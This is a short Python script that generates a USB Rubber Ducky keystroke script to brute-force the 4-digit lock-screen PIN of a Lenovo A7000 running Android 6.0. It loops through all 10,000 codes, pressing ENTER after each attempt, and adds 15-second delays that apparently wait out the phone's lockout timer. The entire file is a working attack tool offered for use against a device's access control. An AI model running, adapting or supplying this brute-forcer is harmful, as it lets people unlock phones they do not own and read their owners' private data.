#!/usr/bin/env python

'''
Generates ducky script that
unlocks Lenovo A7000 Android 6.0 lock-screen

Author: George Cherian
Email: george_cherian@outlook.com
'''

counter = 0 # initialize coounter

print('DELAY 1000')
print ('SPACE') # space brings out pin entry screen
print('DELAY 250')
print ('SPACE')
print('DELAY 250')

for digit0 in range(10):
    for digit1 in range(10):
        for digit2 in range(10):
            for digit3 in range(10):
                counter +=1
                code = str(digit0)+str(digit1)+str(digit2)+str(digit3)
                print(str('STRING ')+str(code))
                print ('DELAY 250')
                print('ENTER')
                print ('DELAY 250')
                print('ENTER')
                print ('DELAY 250')

                if (counter == 5 or counter >= 10):
                    print ('DELAY 15000')
                    print('SPACE')
                    print('DELAY 250')
                    print('SPACE')
                    print('DELAY 250')
